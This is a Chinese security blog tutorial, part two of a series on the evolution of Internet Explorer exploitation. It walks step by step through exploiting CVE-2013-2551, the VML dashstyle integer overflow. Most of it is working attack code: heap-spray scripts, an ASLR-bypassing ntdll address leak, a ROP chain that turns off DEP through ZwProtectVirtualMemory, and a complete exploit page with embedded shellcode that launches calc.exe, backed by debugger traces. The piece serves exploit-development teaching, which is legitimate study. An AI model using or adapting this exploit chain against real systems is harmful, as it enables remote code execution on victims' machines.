# 【技术分享】 ​IE浏览器漏洞利用技术的演变 ( 二 )

阅读量 **139850**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-09-13 15:46:01

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

****

**作者：**[ **hac425**](http://bobao.360.cn/member/contribute?uid=2553709124)

**稿费：500RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**

**传送门**

【技术分享】 IE浏览器漏洞利用技术的演变 ( 一）
[http://bobao.360.cn/learning/detail/3021.html](http://bobao.360.cn/learning/detail/3021.html)

  

**前言**

在上一篇文章中，我们讲了一些早期的 ie相关的漏洞的利用，从最基础，最简单的栈溢出漏洞的利用说起，到相对而言更加复杂的UAF
漏洞利用。透过这些漏洞利用的演变，我们仿佛可以看到人类社会由原始野蛮的社会向一个文明的社会的演变的一个缩影。针对IE的漏洞利用，最开始是使用栈溢出漏洞，栈溢出漏洞的利用非常的简单粗暴，我们可以直接通过过长的字符串覆盖掉函数的返回地址或者seh链的结构来直接的劫持掉程序的eip，控制程序的执行流程。在实际利用时，为了稳定性和简便性，一般先使用堆喷射技术将我们的
payload (nops + shellcode)布置到一个可以预测的地址，这个地址一般是0x0c0c0c0c，之后将通过溢出把 eip的值控制为
0x0c0c0c0c 实现，之后程序会跳入到nops 块中，最终执行到shellcode区，完成漏洞利用。

可以看到这整个过程非常的简单粗暴，用仙果的话来说就是这样的漏洞利用”不优雅＂，后来UAF漏洞出现了，漏洞利用技术也变得优雅了起来，针对
UAF漏洞的利用，hacker们的手法也比之前的栈溢出漏洞的利用手法，精细了不少，利用的套路是：等存在漏洞的对象被释放后，申请一些大小与被释放对象所占内存大小相同的对象，实现＂占坑＂，之后在修改那块内存的数据（一般是开始４字节，虚表），最后调用虚函数，触发漏洞，劫持eip。

可以很明显的感受到整个漏洞利用的流程比之前要优雅了不少，hacker们需要小心的操纵内存的分配，以实现对那块释放的内存的重利用。当然这整个过程还是有＂不优雅＂的地方，在漏洞利用的最后阶段，我们利用的还是最开始的那一种布置shellcode的方法，就直接大量地喷射内存，不管三七二十一把eip设为0x0c0c0c0c
实现漏洞的利用。这种方式在没有DEP 的情况下还是可取的。但是 DEP 爸爸一来，什么都变了。

那么DEP到底啥呢？DEP（数据执行保护，Data Execution
Prevention）的基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入ShellCode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。而我们之前的漏洞利用的最后一步都是直接跳到数据区去执行代码的，这样在DEP作用下我们先前所有的漏洞利用都会被操作系统终结到最后一步，是不是很气？我觉得当时的hacker们一定是非常无奈的（我都搞定eip了，你却不让我执行我的代码，你逗我玩呢？

但
hacker的信条里没有＂放弃＂这个词，有的只是＂突破一切＂！一段时间的困惑之后，有些聪明hacker发现，你不是不让我执行我的数据吗？那好我就不执行我的数据，我执行你程序自身的数据总可以了吧。应为程序自身肯定是需要执行代码的，于是我们可以通过重用程序的代码把他们拼接起来最终实现我们需要的功能。这种技术被称为ROP（Return
Oriented
Programming，返回导向编程）。关于ROP技术详细介绍，利用的方式网上已有大量的文章进行了说明，请不熟悉的读者自行百度，在这里就不赘述了。

**IE浏览器漏洞利用技术的演变**

对于DEP，现在我们就有了ROP这一技术来对其进行绕过。引入了ROP技术的同时，也引入新的问题，大多数情况下我们不会用rop链来实现我们shellcode所需的功能，更通用的方式是通过调用一些系统提供的可以设置内存属性的函数来将shellcode所在内存区域设置为可执行属性，这样一来我们就能执行我们的输入数据了。我们知道用于rop的一些代码段（我们称之为gadgets)
是一些以 ret指令结尾的代码片段。而 ret
指令是对栈上的数据进行操作的，而现实是我们现在获得的ie漏洞基本没有可以控制栈数据的了。我们能控制的只有堆上面的数据（通过使用＂堆喷射＂技术），这时我们要用到一个有趣的指令：xchg
reg ,esp
这样的一条指令作用是交换reg寄存器与esp寄存器的值。而在一些堆相关的漏洞中我们往往能控制至少一个寄存器的值，设想一下我们将某个寄存器的值设为0x0c0c0c0c
(没错又是这个有趣的地址)，再使用一条xchg指令将esp的值和该寄存器的值互换，这样一来程序的栈就变成了我们可控的地方了，漏洞利用是不是又变得优雅了一些。

现在还剩下最后一个问题：在我们成功执行rop链设置shellcode所在内存为可执行属性之前，我们没有办法执行堆上的数据的，所以在我们使用类似于xchg
reg ,esp
的指令切换好栈后，我们ret的地址必须是在rop链的第一个地址。要解决这个问题就要用到＂精准的堆喷射＂技术。我们知道动态申请的内存的地址是不断变化的，所以位于
0x0c0c0c0c地址处的数据也应该是会变化的，所谓的＂精准的堆喷射＂就是使用一些特殊的堆布局使得位于0x0c0c0c0c处的数据为一个恒定的值，这样一来，在ie
中使用rop的又一道难关被突破。下面来实战下＂精准的堆喷射＂吧！

先来一个可以在ie8上进行堆喷射的脚本：

    
    
    <html>
    <head>
    <script>
     // [ Shellcode ]
    var shellcode = "xccxcc"
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length < 0x1000){
     fill += fill;
     }
     // [ fill each chunk with 0x1000 bytes ]
     evilcode = shellcode + fill.substring(0, 0x800 - shellcode.length);
     // [ repeat the block to 512KB ]
     while (evilcode.length < 0x40000){
     evilcode += evilcode;
     }
     // [ substring(2, 0x40000 - 0x21) - IE8 ]
     var block = evilcode.substring(2, 0x40000 - 0x21);
     // [ Allocate 200 MB ]
     var slide = new Array();
     for (var i = 0; i < 400; i++){
     slide[i] = block.substring(0, block.length);
     }
    (1);
    </script>
    </body>
    </html>

弹出弹框(为了便于调试，相当于下个断点）时用调试器附加上，看看内存的布局．

可以看到我们已经能够将数据喷射到 **0x0c0c0c0c** 这个地址处了。下一步我们该做的就是控制 **0x0c0c0c0c**
这个地址处的值。基于前辈们的努力，我们可以使用以下方法控制该处的值。具体的做法如下：

1.当完成堆的喷射之后，查看 **0x0c0c0c0c** 所在的堆块的属性。做法是：在完成堆喷射后，使用windbg附加上ie，输入：＂ **!heap
-p -a 0c0c0c0c** ＂命令。

2.来一波数学计算吧

以看出，0x0C0C0C0C所在堆块的 **UserPtr为0x0c050020** ，可以计算：

    
    
    0x0C0C0C0C - 0x0c050020 = 0x70BEC
    0x50BEC / 2 = 0x385F6
    0x285F6 % 0x1000 = 0x5F6

其中第一个表达式求出0x0C0C0C0C到UserPtr的距离，因为JavaScript中字符串是Unicode形式的，所以在第二个表达式中我们进行了除以2的操作，又因为堆块的对齐粒度是0×1000，所以将结果对0×1000进行取余。
**注意每一次查看0x0C0C0C0C所在堆块的UserPtr会不尽相同，但是在特定的环境下计算出来的最终结果基本是一致的**
，于是堆中每一块0×1000大小的数据看起来如图所示：

我们通过把每个0×1000大小的数据块，以上图所示的样子布局就能控制好 0x0c0c0c0c 处的值．

修改后堆喷射脚本为：

    
    
     <html>
     <head>
    <script>
     // [ Shellcode ]
    var shellcode = unescape("%u4242%u4242");
    var rop_chains = unescape("%u4141%u4141");
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length < 0x1000){
     fill += fill;
     }
     // [ padding offset ]
     padding = fill.substring(0, 0x5F6);
     // [ fill each chunk with 0x1000 bytes ]
     evilcode = padding + rop_chains + shellcode + fill.substring(0, 0x800 - padding.length - rop_chains.length - shellcode.length);
     // [ repeat the block to 512KB ]
     while (evilcode.length < 0x40000){
     evilcode += evilcode;
     }
     // [ substring(2, 0x40000 - 0x21) - IE8 ]
     var block = evilcode.substring(2, 0x40000 - 0x21);
     // [ Allocate 200 MB ]
     var slide = new Array();
     for (var i = 0; i < 400; i++){
     slide[i] = block.substring(0, block.length);
     }
    (1);
    </script>
    </body>
    </html>

效果就是：

可以看到现在的0x0c0c0c0c处的值恰好为rop链的开头。又一个难关被攻克。

下面进入今天的这个漏洞，今天要完成漏洞利用的漏洞是: **CVE-2013-2551 IE COALineDashStyleArray** 整数溢出漏洞。

**漏洞产生的原理是**

在更改dashstyle数组的长度时，程序会将重新设置的长度与当前数组长度进行比较，如果大于当前数组长度就会重新分配一块内存来存储数组。小于的话就不分配内存。而在进行长度值比较时，使用的是有符号比较，所以当我们将长度设为0-1=0xffffffff时，就会发生整数溢出，使得不重新分配内存，但是数组的长度已经变大，于是我们就能越界读写相邻的内存了。

那么我们应该怎么利用这种漏洞呢？套路是，分配大量的其他的对象，在他们的中间插入一个存在越界读写漏洞的对象（在这里是dashstyle数组）。之后触发漏洞，读取相邻对象的一些特殊的结构，来计算模块基地址绕过ASLR
,构造rop链，之后再次触发漏洞，将相邻对象的虚表指针修改以控制程序的执行流程。

**具体到这个漏洞的做法是：**

    
    
    1.通过构造0x400个COARuntimeStyle对象，在第0x301处创建一个包含44个元素的dashstyle数组.这样一来会分配4*44=0xb0大小的ORG数组．这样一来ORG数组和COARuntimeStyle对象就会相邻，此时利用漏洞越界访问到位于COARuntimeStyle对象偏移0x58的字符串（即marginLeft 属性值）的地址，之后将其地址设置为0x7ffe0300，在这个地址处存放的值与ntdll.dll模块的基地址有一个固定的偏移，这样我们再读取marginLeft 属性值就能读到那个有固定偏移的值，在通过计算我们可以得到ntdll.dll模块基地址绕过aslr.　poc中的相关代码如下：
        vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;
        var leak = a[i].marginLeft;
    2.通过第一步中泄露出来的基地址，使用ntdll模块中的指令构造出 rop链来调用ntdll!ZwProtectVirtualMemory　函数将shellcode地址设置为可读可写可执行权限，从而绕过 DEP ，并利用＂精准堆喷射＂技术将rop链的开头喷射到 0x0c0c0c0c这个地址处，再次的触发漏洞，修改对象的虚表，从而获得代码执行．覆盖虚表的关键代码如下：
        vml1.dashstyle.array.length = 0 - 1;
        vml1.dashstyle.array.item(6) = 0x0c0c0c0c;

先来看看实现信息泄露的poc代码：

    
    
     <html>
     <head>
    <meta http-equiv="x-ua-compatible" content="IE=EmulateIE9" >
    </head>
    <title>
    ms13_037
    </title>
    <!-- Include the VML behavior -->
    <style>v: * { behavior:url(#default#VML); display:inline-block }</style>
    <!-- Declare the VML namespace -->
    <xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />
    <script>
    var rect_array = new Array()
    var a          = new Array()
    function createRects(){
     for(var i=0; i<0x400; i++){
     rect_array[i]    = document.createElement("v:shape")
     rect_array[i].id = "rect" + i.toString()
     document.body.appendChild(rect_array[i])
     }
    }
    function getNtdllBase(){
     var vml1  = document.getElementById("vml1")
     var shape = document.getElementById("shape")
     for (var i=0; i<0x400; i++){    //set up the heap
    a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle;
     }
     for (var i=0; i<0x400; i++){
    a[i].rotation;                                                   //create a COARuntimeStyle
    if (i == 0x300) {                                                //allocate an ORG array of size B0h
    vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"
      }
     }
     var length_orig = vml1.dashstyle.array.length;
    vml1.dashstyle.array.length      = 0 - 1;
    for (var i=0; i<0x400; i++) {
    a[i].marginLeft   = "a";
    marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);
    if (marginLeftAddress > 0) {
     vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;
     var leak = a[i].marginLeft;
     vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress;
     vml1.dashstyle.array.length = length_orig;
     ntdll_base=parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16), 16 ) - 290992;
     (ntdll_base.toString(16));
     break;
     }
     }
     return ntdll_base;
    }
    </script>
    <body onload="createRects();">
    <v:oval>
    <v:stroke id="vml1"/>
    </v:oval>
    <v:oval>
    <v:stroke dashstyle="2 2 2 0 2 2 2 0" id="shape"/>
    </v:oval>
    <input value="GetNtdllBaseAddr"type="button" onclick="getNtdllBase();"></input>
    </body>
    </html>

和先前说的一样， **先** **通过vml1.dashstyle.array.item(0x2E+0x16) =
0x7ffe0300将marginLeft属性值的地址设为0x7ffe0300，**

**再通过读取marginLeft属性值获取
0x7ffe0300处四字节数据，减去0x470b0（即290992,同时dll版本不同偏移也不一样）得到ntdll的基地址** ，来看看效果：

可以看到我们的信息泄露时成功的，我们再从调试器的角度来验证下这个计算公式是否正确。附加进程断下后，查看0x7ffe0300处的数据：

    
    
    0:015> dd 0x7ffe0300
    7ffe0300  775e70b0 775e70b4 00000000 00000000
    7ffe0310  00000000 00000000 00000000 00000000
    7ffe0320  0006330e 00000000 00000000 00000000
    7ffe0330  cffa5133 00000000 00000dd0 00000000
    7ffe0340  00000000 00000000 00000000 00000000
    7ffe0350  00000000 00000000 00000000 00000000
    7ffe0360  00000000 00000000 00000000 00000000
    7ffe0370  00000000 00000000 00000000 00000000

**0x775e70b0－0x470b0 = 0x775a0000**
等于模块基地址，说明成功。现在我们已经得到了ntdll模块基地址于是我们就能构造我们的rop链了。下面我们将使用先前得到的模块基地址构造rop链之后再用”精准的堆喷射”技术将rop
链精准的布置到0x0c0c0c0c处。由于先前已经介绍了获取基地址的方式，这里直接定义基地址的值以减少篇幅。

喷射代码：

    
    
     <html>
     <head>
    <script>
    function getRealAddr(base ,offect){
     var real_addr = base + offect;
     var str = real_addr.toString(16);
     var s1 = str.substring(0,4);
     var s2 = str.substring(4,8);
     return "%u" + s2 + "%u" + s1
    }
    var ntdll_base = 0x775a0000;
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);//# ret # from ntdll
    stack_pivot += getRealAddr(ntdll_base,0x000096c9);//# pop ebx # ret # from ntdll
    stack_pivot += getRealAddr(ntdll_base,0x00015789);// # xchg eax, esp # ret from ntdll
    ntdll_rop = getRealAddr(ntdll_base ,0x45F18);//# ntdll!ZwProtectVirtualMemory
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%uffff%uffff";
    ntdll_rop += "%u0c34%u0c0c";
    ntdll_rop += "%u0c38%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0c3c%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0400%u0000";
    ntdll_rop += "%u4141%u4141";
    rop_chains = unescape(stack_pivot + ntdll_rop);
    //heapspray  
     // [ Shellcode ]
    var shellcode = unescape(
    "%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" +
    "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" +
    "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" +
    "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" +
    "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" +
    "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" +
    "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
    "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" +
    "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
    "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" +
    "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" +
    "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" +
    "%u6c61%u2e63%u7865%u0065");
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length < 0x1000){
     fill += fill;
     }
     // [ padding offset ]
     padding = fill.substring(0, 0x5F6);
     // [ fill each chunk with 0x1000 bytes ]
     evilcode = padding + rop_chains + shellcode + fill.substring(0, 0x800 - padding.length - rop_chains.length - shellcode.length);
     // [ repeat the block to 512KB ]
     while (evilcode.length < 0x40000){
     evilcode += evilcode;
     }
     // [ substring(2, 0x40000 - 0x21) - XP SP3 + IE8 ]
     var block = evilcode.substring(2, 0x40000 - 0x21);
     // [ Allocate 200 MB ]
     var slide = new Array();
     for (var i = 0; i < 400; i++){
     slide[i] = block.substring(0, block.length);
     }
     ("heapspray done");
    </script>
    </head>
    </html>

效果：

对比脚本代码，我们知道堆喷射也成功了。位于0x0c0c0c0c地址处的数据恰好是rop的开头。前面代码的rop链构造的有些奇怪，和我开头所说的有点不同，它在xchg指令之前还有一些指令，这是为什么呢?
其实这是根据漏洞实际情况来构造的。我们看看劫持程序时的一个情景：

    
    
    0:014> g
    (430.99c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=41414141 ebx=1260773c ecx=12d0b010 edx=00000c8d esi=12607750 edi=12607738
    eip=6ca5f20f esp=024eb5d0 ebp=024eb608 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:WindowsSystem32mshtml.dll - 
    mshtml!Ordinal104+0x4ec70:
    6ca5f20f ff5008          call    dword ptr [eax+8]    ds:0023:41414149=????????
    0:005> u
    mshtml!Ordinal104+0x4ec70:
    6ca5f20f ff5008          call    dword ptr [eax+8]
    6ca5f212 ebf7            jmp     mshtml!Ordinal104+0x4ec6c (6ca5f20b)
    6ca5f214 90              nop
    6ca5f215 90              nop
    6ca5f216 90              nop
    6ca5f217 90              nop
    6ca5f218 90              nop
    6ca5f219 8b425c          mov     eax,dword ptr [edx+5Ch]

这里的eax的值就是通过 **vml1.dashstyle.array.item(6) = 0x41414141**
设置的，设置成0x41414141的目的是为了便于分析劫持程序流程时的一些情况。可以看到eax的值就是我们设置的。程序最终会调用 **call dword
ptr [eax+8]** 指令来实现虚函数调用。我们来将eax假定为 0x0c0c0c0c，对照着rop链来推理一波。

    
    
    rop链：
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);//# ret # from ntdll　　　　<－－－－－－－－－0x0c0c0c0c
    stack_pivot += getRealAddr(ntdll_base,0x000096c9);//# pop ebx # ret # from ntdll
    stack_pivot += getRealAddr(ntdll_base,0x00015789);// # xchg eax, esp # ret from ntdll
    ntdll_rop = getRealAddr(ntdll_base ,0x45F18);//# ntdll!ZwProtectVirtualMemory
    ntdll_rop += "%u0c40%u0c0c";//# ret to shellcode
    ntdll_rop += "%uffff%uffff";//
    ntdll_rop += "%u0c34%u0c0c";
    ntdll_rop += "%u0c38%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0c3c%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0400%u0000";
    ntdll_rop += "%u4141%u4141";
    rop_chains = unescape(stack_pivot + ntdll_rop);

**eax=0x0c0c0c0c 那么call dword ptr [eax+8] 程序就会去执行 # xchg eax, esp # ret ， xchg
eax,esp后,esp指向了0x0c0c0c0c，再来一个ret ，,就会跳转到另一个ret指令，然后进入下一条rop指令，# pop ebx # ret
，这样一个pop就将我们刚才执行过的xchg指令绕过了。**

再来一个ret，我们就会跳转到ntdll!ZwProtectVirtualMemory函数，执行，函数的参数已经布置好了。函数执行完毕时，我们的shellcode所在的内存区域就会被设置为可执行，并会跳转到shellcode这样就绕过了DEP。我们来实际调试下这样的一段rop指令。改怎么调试呢？我们可以在0x0c0c0c14处下
硬件读取断点。因为位于0x0c0c0c14处的值就是xchg指令的地址，一般而言这种ie的rop链第一步就是使用类似于
xchg指令来把堆伪造成栈。所以我们在这下断点。

这里使用的poc(同样为了简便，将没有使用信息泄露，直接硬编码了ntdll模块基地址，这个需要修改）:

    
    
     <html>
    <head>
    <script>
    function getRealAddr(base ,offect){
     var real_addr = base + offect;
     var str = real_addr.toString(16);
     var s1 = str.substring(0,4);
     var s2 = str.substring(4,8);
     return "%u" + s2 + "%u" + s1
    }
    var ntdll_base = 0x775a0000;
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);
    stack_pivot += getRealAddr(ntdll_base,0x000096c9);
    stack_pivot += getRealAddr(ntdll_base,0x00015789);
    ntdll_rop = getRealAddr(ntdll_base ,0x45F18);
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%uffff%uffff";
    ntdll_rop += "%u0c34%u0c0c";
    ntdll_rop += "%u0c38%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0c3c%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0400%u0000";
    ntdll_rop += "%u4141%u4141";
    rop_chains = unescape(stack_pivot + ntdll_rop);
    //heapspray  
     // [ Shellcode ]
    var shellcode = unescape(
    "%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" +
    "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" +
    "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" +
    "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" +
    "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" +
    "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" +
    "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
    "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" +
    "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
    "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" +
    "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" +
    "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" +
    "%u6c61%u2e63%u7865%u0065");
     var fill = unescape("%u0c0c%u0c0c");
     while (fill.length < 0x1000){
     fill += fill;
     }
     // [ padding offset ]
     padding = fill.substring(0, 0x5F6);
     // [ fill each chunk with 0x1000 bytes ]
     evilcode = padding + rop_chains + shellcode + fill.substring(0, 0x800 - padding.length - rop_chains.length - shellcode.length);
     // [ repeat the block to 512KB ]
     while (evilcode.length < 0x40000){
     evilcode += evilcode;
     }
     // [ substring(2, 0x40000 - 0x21) - XP SP3 + IE8 ]
     var block = evilcode.substring(2, 0x40000 - 0x21);
     // [ Allocate 200 MB ]
     var slide = new Array();
     for (var i = 0; i < 400; i++){
     slide[i] = block.substring(0, block.length);
     }
     ("heapspray done");
    </script>
    <meta http-equiv="x-ua-compatible" content="IE=EmulateIE9" >
    </head>
    <title>
    </title>
    <style>v: * { behavior:url(#default#VML); display:inline-block }</style>
    <xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />
    <script>
    var rect_array = new Array()
    var a = new Array()
    function createRects(){
    for(var i=0; i<0x1000; i++){
    rect_array[i]    = document.createElement("v:shape")
    rect_array[i].id = "rect" + i.toString()
    document.body.appendChild(rect_array[i])
    }
    }
    function exploit(){
    var vml1 = document.getElementById("vml1")
    for (var i=0; i<0x1000; i++){
    a[i] = document.getElementById("rect" + i.toString())._anchorRect;
    if (i == 0x800) {
    vml1.dashstyle = "1 2 3 4"
    }
    }
    vml1.dashstyle.array.length = 0 - 1;
    vml1.dashstyle.array.item(6) = 0x0c0c0c0c;
    for (var i=0; i<0x1000; i++)
    {
    delete a[i];
    CollectGarbage();
    }
    location.reload();
    }
    </script>
    <body onload="createRects(); exploit();">
    <v:oval>
    <v:stroke id="vml1"/>
    </v:oval>
    </body>
    </html>

rop链的调试过程如下：

    
    
    0:014> ba r4 0c0c0c14
    0:014> g
    Breakpoint 0 hit
    eax=0c0c0c0c ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b5789 esp=0243b1b4 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b1:
    775b5789 94              xchg    eax,esp
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b578a esp=0c0c0c0c ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
    775b578a c3              ret
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b578a esp=0c0c0c10 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
    775b578a c3              ret
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775a96c9 esp=0c0c0c14 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlLockMemoryBlockLookaside+0x88:
    775a96c9 5b              pop     ebx
    0:005> p
    Breakpoint 0 hit
    eax=0243b1b4 ebx=775b5789 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775a96ca esp=0c0c0c18 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlLockMemoryBlockLookaside+0x89:
    775a96ca c3              ret
    0:005> p
    eax=0243b1b4 ebx=775b5789 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775e5f18 esp=0c0c0c1c ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!ZwProtectVirtualMemory:
    775e5f18 b8d7000000      mov     eax,0D7h
    可以看到rop链如我们预期的那样运行着．我们再在 0c0c0c40处下断点，应为这里时shellcode的起始地址，我们看看DEP是否关闭成功：
    0:005> bp 0c0c0c40
    0:005> g
    Breakpoint 1 hit
    eax=c0000045 ebx=775b5789 ecx=0c0c0c18 edx=775e70b4 esi=1264d878 edi=1264d860
    eip=0c0c0c40 esp=0c0c0c34 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    0c0c0c40 fc              cld
    0:005> p
    eax=c0000045 ebx=775b5789 ecx=0c0c0c18 edx=775e70b4 esi=1264d878 edi=1264d860
    eip=0c0c0c41 esp=0c0c0c34 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    0c0c0c41 e889000000      call    0c0c0ccf

可以看到是成功的，我们已经能执行堆中的数据了^__^ ,此时按下g 我们的计算器就弹出来了．

这样，这个漏洞的漏洞利用就被我们分段的完成了，我们回过头来看看整个漏洞利用过程。首先我们通过数组越界修改对象的属性值地址，读到了一个值，通过这个值计算出了ntdll模块的基地址，并通过该基地址构造出rop链，之后又再次触发了漏洞，修改对象虚表指针，劫持程序执行流，完成了整个漏洞利用。这其中的每一步都是那么精妙，可以说只要稍微有点偏差，整个漏洞利用就会失败。可以说这样的漏洞利用真正的可以配得上＂优雅＂这个词语了。整个漏洞利用的一个连贯过程，metasploit上实现的非常棒，我们来看看效果。

可以看到metasploit把漏洞利用玩的像一件艺术品一样，厉害！

**  
**

**传送门**

* * *

【技术分享】 IE浏览器漏洞利用技术的演变 ( 一） <http://bobao.360.cn/learning/detail/3021.html>

  

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **for_while** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84558](/post/id/84558)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t011d66e4d0ee6ef2b8.jpg) for_while

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

